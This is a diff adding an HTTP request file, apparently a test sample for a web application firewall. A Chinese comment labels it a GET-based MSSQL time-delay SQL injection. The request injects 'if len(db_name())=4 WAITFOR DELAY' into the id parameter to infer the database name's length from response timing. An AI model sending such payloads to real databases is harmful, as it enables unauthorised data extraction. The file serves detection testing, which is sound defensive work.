@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_延时注入-06506449
+# 攻击者基于延时查询，将"if len(db_name())=4 WAITFOR DELAY '0:0:5'"语句注入到 SQL 查询参数中，利用WAITFOR DELAY来延长数据库处理时间，通过加载时间来对注入结果进行判定以获取数据库名长度。
+GET /?id=1%20and%20if%20len%28db_name%28%29%29=4%20WAITFOR%20DELAY%20%270:0:5%27&bid=hd_tag_m8mv26mr HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26mr
+RM-PRO-Token: 9ba00db54a997db5f7d9d22057269591
+RM-PRO-Time: 1742808637872
+User-Agent: curl/7.83.1
+
